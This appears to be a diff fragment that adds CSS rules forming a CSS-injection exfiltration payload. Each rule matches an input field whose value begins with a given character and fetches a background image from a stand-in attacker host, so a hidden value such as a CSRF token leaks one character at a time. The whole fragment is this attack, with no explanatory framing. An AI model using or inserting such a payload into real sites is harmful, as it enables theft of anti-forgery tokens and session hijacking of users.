@@ -1,0 +1,10 @@
+input[value^="0"] { background: url(http://attacker.site/csrfis/0) }
+input[value^="1"] { background: url(http://attacker.site/csrfis/1) }
+   /* ... */
+input[value^="8"] { background: url(http://attacker.site/csrfis/8) }
+input[value^="9"] { background: url(http://attacker.site/csrfis/9) }
+input[value^="a"] { background: url(http://attacker.site/csrfis/a) }
+input[value^="b"] { background: url(http://attacker.site/csrfis/b) }
+   /* ... */
+input[value^="y"] { background: url(http://attacker.site/csrfis/y) }
+input[value^="z"] { background: url(http://attacker.site/csrfis/z) }
